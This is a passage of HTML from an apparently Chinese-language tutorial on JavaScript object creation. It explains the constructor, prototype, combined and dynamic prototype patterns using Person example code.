name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">alert(person1<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span> == person2<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span>)<span class=\"\" style=\"color: rgb(136, 0, 0);\">; &nbsp;//false</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然而，创建两个完成同样任务的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的确没有必要；况且有<span style=\"color: rgb(0, 128, 255);\">this</span>对象在，根本不用在执行代码前就把函数绑定到特定的对象上。因此，可以像下面这样，通过把函数定义转移到构造函数外部来解决这个问题。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = sayName;</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span> sayName<span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样做解决了多个函数解决相同问题的问题，但是有产生了新的问题，在全局作用域中实际上只被某个对象调用，这让全局对象有点名不副实。更让人无法接受的是：如果对象需要定义很多方法，那么就要定义很多全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。好在这些问题可以使用原型模式来解决。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>三、原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify;\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify; color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们创建的每个函数都有一个<span style=\"text-align: justify; color: rgb(0, 128, 255);\">prototype</span>（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。使用原型对象的实例就是让所有实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象的实例信息，而是可以将这些信息直接添加到原型对象中，如下所示：</span><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br>}<br>Person.prototype.name = <span class=\"\" style=\"color: rgb(0, 136, 0);\">“wei”</span>;<br>Person.prototype.age = <span class=\"\" style=\"color: rgb(0, 102, 102);\">27</span>;<br>Person.prototype.job = <span class=\"\" style=\"color: rgb(0, 136, 0);\">“Software”</span>;<br>Person.prototype.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp;<br> &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br>}<br> <br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person();</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//“wei”</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\"><br>var</span> person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person();</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person2.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//“wei”</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><br><span style=\"font-size: 14px;\">alert(person1.sayName == person2.sayName);</span></code></p></pre></section></section></section></section></section></section></section></section></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"box-sizing: border-box;\"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在此，我们将<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法和所有的属性直接添加在了<span style=\"color: rgb(0, 128, 255);\">Person</span>的<span style=\"color: rgb(0, 128, 255);\">prototype</span>属性中，构造函数变成了空函数。即便如此，我们仍然可以通过构造函数来创建新对象，而且新对象还会具有相同的属性和方法。但是与构造函数不同的是，新对象的这些属性和方法是由所有实例共享的。换句话说，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>访问的都是同一组属性和同一个<span style=\"color: rgb(0, 128, 255);\">sayName()</span>函数。要理解原型模式的工作原理，就必须先理解ECMAScript中原型对象的性质。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型对象的本性由于篇幅太长将会在下一章节详细分析。上面我们说了原型模式的好处，接下来我们来看一下原型模式的缺点。原型模式省略了为构造函数传递参数的这一环节，结果所有实例在默认情况下都具有相同的属性值。这会在某些程度上带来一种不便，这并不是原型模式最大的问题，因为如果我们想为一个通过原型模式创建的对象添加属性时，添加的这个属性就会屏蔽原型对象的保存的同名属性。换句话说，就是添加的这个属性会阻止我们去访问原型中的属性，但并不会改变原型中的属性。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型模式最大的问题是由其共享的本质所导致的。原型中所有的属性被很多实例共享，这种共享对函数非常合适，对包含基本值的属性也说的过去，但是对引用类型的属性值来说问题就比较突出了，下面我们来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\">function</span> Person(){<br>}<br>Person.prototype = { &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">constructor</span>:Person, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">name</span>:<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">age</span>:<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">friends</span>:[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>], &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">sayName</span>:<span class=\"\" style=\"box-sizing: border-box;\">function</span>(){<br> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br>person1.friends.push(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>);<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">true</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子中，<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>对象有一个名为<span style=\"color: rgb(0, 128, 255);\">friends</span>的属性，该属性包含一个字符串数组。然后创建了两个<span style=\"color: rgb(0, 128, 255);\">Person</span>的实例，接着修改<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>引用的数组，向数组中添加一个字符串，由于数组存在于<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>中而不是<span style=\"color: rgb(0, 128, 255);\">person1</span>中，所以<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>也会被修改。但是一般每个对象都是要有属于自己的属性的，所以我们很少看到有人单独使用原型模式来创建对象。</p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p></section></section><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>四、组合使用构造函数模式和原型模式</strong></span><span style=\"color: rgb(136, 136, 136);\"></span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义类型最常见的方式就是组合使用构造函数模式与原型模式。构造函数模式用于定义实例属性，原型模式用于定义方法和共享的属性。结果，每个实例都会有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度的节省了内存。另外，这种混成模式还支持向构造函数传递参数；可谓是集两种模式之长。下面的代码重写了前面的例子：</span></p></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">function Person(name, age){ &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>];</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">Person.prototype = { &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;constructor</span>:Person, &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;sayName</span>:function(){</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“bu”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">25</span>);</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">false</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.sayName === person2.sayName); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，实例属性都是在构造函数中定义的，而由所有实例共享的属性<span style=\"color: rgb(0, 128, 255);\">constructor</span>和方法<span style=\"color: rgb(0, 128, 255);\">sayName()</span>则是在原型中定义的。所以修改了<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>并不会改变<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>，因为他们分别引用了不同的数组。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种构造函数与原型模式混成的模式，是目前在ECMAScript中使用最广泛、认同度最高的一种创建自定义类型的方法。可以说，这是用来定义引用的一种默认形式。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>五、动态原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有其他OO语言经验的开发人员在看到独立的构造函数和原型时，很可能会感到非常的困惑。动态原型模式就是用来解决这个问题的一个方案，它把所有的信息都封装在了构造函数中，而通过构造函数中初始化原型（仅在必要的情况下），又保持了同时使用构造函数和原型的优点。换句话说，可以通过检查某个应该存在的方法是否有效，来决定是否要初始化原型。来看一个例子：</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>]; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//注意if语句</span></span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">if</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">typeof</span> <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.sayName!=<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“function”</span>){<br>&nbsp;&nbsp;&nbsp;&nbsp;Person.prototype.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{ <br>&nbsp;&nbsp;&nbsp;&nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>);<br>person1.sayName();</span></code></pre></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意构造函数代码中的if语句，这里只在<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法不存在的情况下才会将它添加到原型中。这断代码只有在第一次调用构造函数的时候才会被执行。此后，原型已经被初始化，不需要再做什么修改。不过要记住，这里所做的修改能立即在所有实例中得到反映。因此，这种方法可以说确实非常完美。其中if语句检查的是初始化之后应该存在的任何方法和属性–不必再用一大堆if来检查每个属性和方法，只检查其中一个即可。对于采用这样模式创建的对象，还可以使用<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符来确定他的类型。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：使用动态原型模式时，不能使用对象字面量重写原型。如果在已经创建了实例的情况下重写原型，那么就会切断现有的实例与新原型之间的联系。</strong></span><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); 